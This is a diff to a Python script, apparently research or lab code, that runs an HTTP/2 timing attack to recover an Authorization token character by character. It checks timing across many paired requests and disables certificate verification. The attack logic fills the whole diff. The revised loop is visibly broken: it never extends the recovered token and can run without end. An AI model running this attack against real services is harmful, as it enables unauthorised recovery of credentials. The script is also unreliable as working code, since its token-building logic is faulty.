@@ -5,6 +5,7 @@ import logging
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger('research')
+logging.getLogger('H2Protocol').setLevel(logging.WARNING)  # Disable H2Protocol logger
 
 async def create_auth_request(token: str) -> H2Request:
     """Create an H2Request with the specified Authorization token."""
@@ -28,7 +29,7 @@ async def run_two_gets():
 
 async def perform_timing_attack(token_prefix: str, char_set: str = string.digits + string.ascii_uppercase) -> str:
     """Perform a timing attack to find the next character in the token."""
-    best_char = None
+    potential_chars = set()
     best_score = float('-inf')
     
     for char in char_set:
@@ -36,28 +37,37 @@ async def perform_timing_attack(token_prefix: str, char_set: str = string.digits
         r1 = await create_auth_request(test_token)
         r2 = await create_auth_request(test_token + "x")  # Control request with invalid next char
         
-        logger.info(f"Testing character: {char}")
-        async with H2Time(r1, r2, num_request_pairs=100, sequential=True, verify_cert=False) as h2t:
+        async with H2Time(r1, r2, num_request_pairs=100, sequential=False, verify_cert=False) as h2t:
             results = await h2t.run_attack()
             if results:
-                # Calculate average timing difference
-                avg_diff = sum(float(r[1]) - float(r[0]) for r in results) / len(results)
-                if avg_diff > best_score:
-                    best_score = avg_diff
-                    best_char = char
-                    logger.info(f"New best character: {char} with score {avg_diff}")
+                first_request_quicker = len([r for r in results if r[0] < 0])
+                second_request_quicker = len([r for r in results if r[0] > 0])
+                diff = abs(first_request_quicker - second_request_quicker)
+                logger.info(f"{char} diff: {diff}")
+                
+                if diff:
+                    potential_chars.add(char)
+                    
+    logger.info(f"Potential chars: {potential_chars}")               
     
-    return best_char
+    return potential_chars
 
 async def find_token() -> str:
     """Find the complete token using timing attacks."""
     token = ""
+    potential_chars = []
     while True:
-        next_char = await perform_timing_attack(token)
-        if not next_char:
+        next_char_set = await perform_timing_attack(token)
+        if not next_char_set:
             break
-        token += next_char
+        potential_chars.append(next_char_set)
         print(f"Found token so far: {token}")
+    
+    if token:
+        print(f"Found token: {token}")
+    else:
+        print("No token found - endpoint not vulnerable")
+
     return token
 
 if __name__ == "__main__":
